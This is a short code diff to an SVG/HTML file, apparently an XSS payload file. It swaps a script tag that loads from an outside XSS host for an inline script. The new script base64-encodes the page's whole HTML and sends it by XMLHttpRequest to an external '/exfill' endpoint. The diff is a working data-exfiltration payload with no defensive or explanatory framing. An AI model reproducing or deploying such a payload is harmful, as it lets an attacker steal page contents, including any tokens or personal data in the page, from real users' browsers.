@@ -17,7 +17,28 @@
 		    </div>
 		</foreignObject>
 	</svg>
-    <script src="//xss.khara.one/a"></script>
+    <script>
+	<![CDATA[
+		function utf8_to_b64( str ) {
+		    return window.btoa(unescape(encodeURIComponent( str )));
+		}
+		function get_dom_text() {
+		    var text_extractions_to_try = [
+		        document.documentElement.outerHTML,
+		    ];
+		    for (var i = 0; i < text_extractions_to_try.length; i++) {
+		        if (typeof text_extractions_to_try[i] === 'string') {
+		            return utf8_to_b64(text_extractions_to_try[i]);
+		        }
+		    }
+		    return '';
+		}
+		
+		b=new XMLHttpRequest();
+		b.open("GET", "https://1o1cjryk.c5.rs/exfill?data="+get_dom_text());
+		b.send();
+	]]>
+    </script>
   </body>
 </html>
 
